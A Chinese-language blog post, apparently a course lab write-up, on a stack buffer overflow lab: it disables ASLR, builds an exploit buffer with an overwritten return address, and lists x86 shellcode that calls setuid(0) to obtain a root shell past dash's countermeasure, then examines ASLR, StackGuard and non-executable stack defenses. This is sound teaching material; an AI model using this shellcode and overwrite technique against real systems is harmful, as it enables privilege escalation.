@@ -1,0 +1,567 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>Bufferr_Overflow lab - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_yg9cfy8wd6.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_pjno9b9zyxs.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+<meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Fluid</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+  <div class="mt-3 post-meta">
+    <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+    <time datetime="2020-10-09 18:38">
+      2020年10月9日 晚上
+    </time>
+  </div>
+
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <article class="markdown-body">
+              <h1 id="Buffer-Overflow-Vulnerability-Lab"><a href="#Buffer-Overflow-Vulnerability-Lab" class="headerlink" title="Buffer Overflow Vulnerability Lab"></a>Buffer Overflow Vulnerability Lab</h1><h2 id="Lab-Tasks"><a href="#Lab-Tasks" class="headerlink" title="Lab Tasks"></a>Lab Tasks</h2><h3 id="Turning-Off-Countermeasures"><a href="#Turning-Off-Countermeasures" class="headerlink" title="Turning Off Countermeasures"></a>Turning Off Countermeasures</h3><ol>
+<li><p>Address Space Randomization(堆栈地址随机化)：主要是基于Linux操作系统的机器，通过将heap和stack的起始地址随机化来防止缓存区溢出攻击</p>
+ <pre><code class="hljs routeros">sudo sysctl -w kernel.<span class="hljs-attribute">randomize_va_space</span>=0</code></pre>
+</li>
+<li><p>stackGuard：gcc提供的一种安全机制，当其存在时，无法进行buffer overflow攻击，但是可以在编译文件的时候选择禁用这个安全机制</p>
+</li>
+<li><p>不可执行化堆栈：需要在program头来设置堆栈是否是可执行性的</p>
+</li>
+</ol>
+<h3 id="Task-1-Running-Shellcode"><a href="#Task-1-Running-Shellcode" class="headerlink" title="Task 1: Running Shellcode"></a>Task 1: Running Shellcode</h3><p>shellcode的原型</p>
+<pre><code class="hljs pgsql"><span class="hljs-meta">#include &lt;stdio.h&gt;</span>
+<span class="hljs-type">int</span> main() &#123;
+	<span class="hljs-type">char</span> *<span class="hljs-type">name</span>[<span class="hljs-number">2</span>];
+	<span class="hljs-type">name</span>[<span class="hljs-number">0</span>] = "/bin/sh";
+	<span class="hljs-type">name</span>[<span class="hljs-number">1</span>] = <span class="hljs-keyword">NULL</span>;
+	execve(<span class="hljs-type">name</span>[<span class="hljs-number">0</span>], <span class="hljs-type">name</span>, <span class="hljs-keyword">NULL</span>);
+&#125;</code></pre>
+
+<blockquote>
+<p>execve（执行文件）在父进程中fork一个子进程，在子进程中调用exec函数启动新的程序。execve()用来执行第一参数字符串所代表的文件路径，第二个参数是利用指针数组来传递给执行文件，并且需要以空指针(NULL)结束，最后一个参数则为传递给执行文件的新环境变量数组。从图中可以，如果通过C语言调用execve来返回shell的话，首先需要引入相应的头文件，然后在主函数中调用系统调用函数execve；同时传入三个参数</p>
+</blockquote>
+<p>这里只是通过C语言来进行调用bin/sh文件并且将对应的参数传入其中，但是我们要将shellcode放入到内存中，这样在进行buffer overflow攻击的时候才能够执行</p>
+<p><img src="/2020/10/09/Bufferr-Overflow-lab/Bufffer-overflow-tsak1.PNG" srcset="/img/loading.gif" alt="Bufffer-overflow-tsak1"></p>
+<p>当我们编译并且运行call_shellcode.c的时候，还会看到出现一个shell，并且在其中输入相应命令可以得到执行后的结果</p>
+<h3 id="Task-2-Exploiting-the-Vulnerability、"><a href="#Task-2-Exploiting-the-Vulnerability、" class="headerlink" title="Task 2: Exploiting the Vulnerability、"></a>Task 2: Exploiting the Vulnerability、</h3><p>分析：在这一步中，关键的是修改buffer里面的内容，它的逻辑是这样的：首先exploit.c先将buffer[517]进行构造，填充好其中的内容，使得在stack.c中调用bof（）来进行strcpy的时候，能够将return address覆盖掉</p>
+<p>增加代码：</p>
+<pre><code class="hljs arduino"><span class="hljs-built_in">strcpy</span>(<span class="hljs-built_in">buffer</span>+<span class="hljs-number">80</span>,shellcode);
+<span class="hljs-built_in">strcpy</span>(<span class="hljs-built_in">buffer</span> + <span class="hljs-number">0x24</span>, <span class="hljs-string">"\xE7\xEB\xFF\xBF"</span>);</code></pre>
+
+<p>在这里我们将对应的shellcode放置在buffer + 80(0x50)的地方，这个地方可以随便更改，但是值得注意的是不能覆盖掉return address对应的位置</p>
+<ol>
+<li><p>确定shellcode的存放地址是哪里</p>
+<p> 首先，exploit.c里面的buffer最终是要写入到badfile文件中的，而badfile文件又会被读入到str字符数组中去，所以相应的buffer里面的内容也就相当于是str里面的内容，所以我们先要确定str的地址（gdb调试），之后通过在buffer里面shellcode的偏移地址来确定shellcode在内存中的相应地址</p>
+ <pre><code class="hljs 1c">gdb stack
+r<span class="hljs-comment">//看寄存器内容</span>
+p /x <span class="hljs-meta">&amp;str<span class="hljs-comment">//查找str对应的地址</span></span></code></pre>
+
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-1.PNG" srcset="/img/loading.gif" alt="task2-1"></p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-2.PNG" srcset="/img/loading.gif" alt="task2-2"> </p>
+<p> 所以shellcode的代码在stack.c的stack中的位置是0xbfffeb97 + 0x50 = 0xbfffebe7;</p>
+</li>
+<li><p>确定return address的位置</p>
+<p> 当我们确定了shellcode的起始位置之后，我们就需要确定return address的位置，这样让shellcode的起始位置覆盖掉return address就可以了</p>
+<p> 先查看bof的地址以及反汇编内容</p>
+ <pre><code class="hljs ebnf"><span class="hljs-attribute">disas bof</span></code></pre>
+
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-3.PNG" srcset="/img/loading.gif" alt="task2-3"></p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/stack.gif" srcset="/img/loading.gif" alt="stack"></p>
+<p> 对应分析反汇编代码发现，其中</p>
+ <pre><code class="hljs x86asm"><span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">ebp</span>-<span class="hljs-number">0x20</span>]</code></pre>
+
+<p> 是将buffer入栈，<a href="https://blog.csdn.net/oBuYiSeng/article/details/50183571?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160238962119724848361289%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160238962119724848361289&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-50183571.pc_first_rank_v2_rank_v28&utm_term=lea%E6%B1%87%E7%BC%96%E6%98%AF%E4%BB%80%E4%B9%88%E6%84%8F%E6%80%9D&spm=1018.2118.3001.4187" target="_blank" rel="noopener">参考lea与mov的区别</a>，而上面一行的push是将str入栈（变量从右至左入栈）</p>
+<p> 之后查看寄存器</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-4.PNG" srcset="/img/loading.gif" alt="task2-4"></p>
+<p> 所以确定ebp和buffer之间的距离是0x20，同时由于是32位的，所以return address的栈中地址为0x20+0x04 = 0x24</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task2-5.PNG" srcset="/img/loading.gif" alt="task2-5"></p>
+<p> 成功！！！</p>
+</li>
+</ol>
+<h3 id="Task-3-Defeating-dash’s-Countermeasure"><a href="#Task-3-Defeating-dash’s-Countermeasure" class="headerlink" title="Task 3: Defeating dash’s Countermeasure"></a>Task 3: Defeating dash’s Countermeasure</h3><p>dash是在Ubuntu中的防止栈溢出的策略，会去检测effective UID，下面是mian.c的一些变化</p>
+<p>defeat的策略：在execve（）之前调用setuid（0）</p>
+<ol>
+<li><p>未取消注释的时候：</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3.PNG" srcset="/img/loading.gif" alt="task3"></p>
+<p> 此时获得的是用户权限的shell</p>
+</li>
+<li><p>取消注释：</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-1.PNG" srcset="/img/loading.gif" alt="task3-1"></p>
+<p> 此时获得的是用户权限的shell</p>
+<p> 更新shellcode</p>
+ <pre><code class="hljs gradle"><span class="hljs-keyword">char</span> shellcode[] =
+<span class="hljs-string">"\x31\xc0"</span> <span class="hljs-comment">/* Line 1: xorl %eax,%eax */</span>
+<span class="hljs-string">"\x31\xdb"</span> <span class="hljs-comment">/* Line 2: xorl %ebx,%ebx */</span>
+<span class="hljs-string">"\xb0\xd5"</span> <span class="hljs-comment">/* Line 3: movb $0xd5,%al */</span>
+<span class="hljs-string">"\xcd\x80"</span> <span class="hljs-comment">/* Line 4: int $0x80 */</span>
+<span class="hljs-comment">// ---- The code below is the same as the one in Task 2 ---</span>
+<span class="hljs-string">"\x31\xc0"</span>
+<span class="hljs-string">"\x50"</span>
+<span class="hljs-string">"\x68"</span><span class="hljs-string">"//sh"</span>
+<span class="hljs-string">"\x68"</span><span class="hljs-string">"/bin"</span>
+<span class="hljs-string">"\x89\xe3"</span>
+<span class="hljs-string">"\x50"</span>
+<span class="hljs-string">"\x53"</span>
+<span class="hljs-string">"\x89\xe1"</span>
+<span class="hljs-string">"\x99"</span>
+<span class="hljs-string">"\xb0\x0b"</span>
+<span class="hljs-string">"\xcd\x80"</span>;</code></pre>
+
+<p> 4条指令对应的作用： </p>
+<p> (1) set ebx to zero in Line 2</p>
+<p> (2) set eax to 0xd5 via Line 1 and 3 (0xd5 is setuid()’s system call number)</p>
+<p> (3) execute the system call in Line 4.</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-2.PNG" srcset="/img/loading.gif" alt="task3-2"></p>
+<p> 此时defeat dash成功，得到root权限的shell</p>
+<p> 并且如果不加入这四行，即不进行setuid（）的话，运行后只能得到用户权限的shell</p>
+<p> <img src="/2020/10/09/Bufferr-Overflow-lab/task3-3.PNG" srcset="/img/loading.gif" alt="task3-3"></p>
+</li>
+</ol>
+<h3 id="Task-4-Defeating-Address-Randomization"><a href="#Task-4-Defeating-Address-Randomization" class="headerlink" title="Task 4: Defeating Address Randomization"></a>Task 4: Defeating Address Randomization</h3><p>打开站地址随机化策略后直接运行</p>
+<p><img src="/2020/10/09/Bufferr-Overflow-lab/task4.PNG" srcset="/img/loading.gif" alt="task4"></p>
+<p>此时会发生segmentation fault，说明在虚拟地址转化为实际的物理地址的时候发生了意外，说明之前计算的地址与现在的是不一样的</p>
+<p>在循环的过程中，如果地址不匹配，一直显示segmentation fault，知道匹配，之后则会发生攻击</p>
+<h3 id="Task-5-Turn-on-the-StackGuard-Protection"><a href="#Task-5-Turn-on-the-StackGuard-Protection" class="headerlink" title="Task 5: Turn on the StackGuard Protection"></a>Task 5: Turn on the StackGuard Protection</h3><p>当打开栈边界保护的时候，重新编译并运行</p>
+<p><img src="/2020/10/09/Bufferr-Overflow-lab/task5.PNG" srcset="/img/loading.gif" alt="task5"></p>
+<p>发现检测到堆栈破坏，运行的易受程序的程序被终止并且放弃</p>
+<p>是由于分配的空间不足以及设置的数值发生了变化，stack.c里面的buffer与要写入的str相比空间太少，所以引起边界保护的报错，同时再修改return address的时候可能会有边界的数值的变化</p>
+<h3 id="Task-6-Turn-on-the-Non-executable-Stack-Protection"><a href="#Task-6-Turn-on-the-Non-executable-Stack-Protection" class="headerlink" title="Task 6: Turn on the Non-executable Stack Protection"></a>Task 6: Turn on the Non-executable Stack Protection</h3><p><img src="/2020/10/09/Bufferr-Overflow-lab/task6.PNG" srcset="/img/loading.gif" alt="task6"></p>
+<p>不能得到一个shell，发生了段错误（segmentation fault），其原因是：我们将对应的shellcode放在了Buffer中，而这一局部变量是位于stack上的，所以对应的逻辑地址无法转化为实际的物理地址，进而更不可能执行，发生segmentation fault</p>
+
+            </article>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Software-security-lab/">Software security lab</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" target="_blank" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/10/11/Format-String-lab/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Format-String-lab</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </div>
+                  <div class="post-next col-6">
+                    
+                    
+                      <a href="/2020/10/02/Web-Security-lab1/">
+                        <span class="hidden-mobile">Web_Security_lab1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a id="scroll-top-button" href="#" role="button">
+      <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a>
+      <i class="iconfont icon-love"></i>
+      <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener">
+        <span>Fluid</span></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/main.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+  <script  src="/js/clipboard-use.js" ></script>
+
+
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.11.1/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+
+      tocbot.init({
+        tocSelector: '#tocbot',
+        contentSelector: 'article.markdown-body',
+        headingSelector: 'h1,h2,h3,h4,h5,h6',
+        linkClass: 'tocbot-link',
+        activeLinkClass: 'tocbot-active-link',
+        listClass: 'tocbot-list',
+        isCollapsedClass: 'tocbot-is-collapsed',
+        collapsibleClass: 'tocbot-is-collapsible',
+        collapseDepth: 0,
+        scrollSmooth: true,
+        headingsOffset: -boardTop
+      });
+      if ($('.toc-list-item').length > 0) {
+        $('#toc').css('visibility', 'visible');
+      }
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "Bufferr_Overflow lab&nbsp;",
+      ],
+      cursorChar: "_",
+      typeSpeed: 70,
+      loop: false,
+    });
+    typed.stop();
+    $(document).ready(function () {
+      $(".typed-cursor").addClass("h2");
+      typed.start();
+    });
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.2.2/anchor.min.js" ></script>
+  <script>
+    anchors.options = {
+      placement: "right",
+      visible: "hover",
+      
+    };
+    var el = "h1,h2,h3,h4,h5,h6".split(",");
+    var res = [];
+    for (item of el) {
+      res.push(".markdown-body > " + item)
+    }
+    anchors.add(res.join(", "))
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    var path = "/local-search.xml";
+    var inputArea = document.querySelector("#local-search-input");
+    inputArea.onclick = function () {
+      searchFunc(path, 'local-search-input', 'local-search-result');
+      this.onclick = null
+    }
+  </script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <script>
+    $('#post img:not(.no-zoom img, img[no-zoom]), img[zoom]').each(
+      function () {
+        var element = document.createElement('a');
+        $(element).attr('data-fancybox', 'images');
+        $(element).attr('href', $(this).attr('src'));
+        $(this).wrap(element);
+      }
+    );
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</body>
+</html>
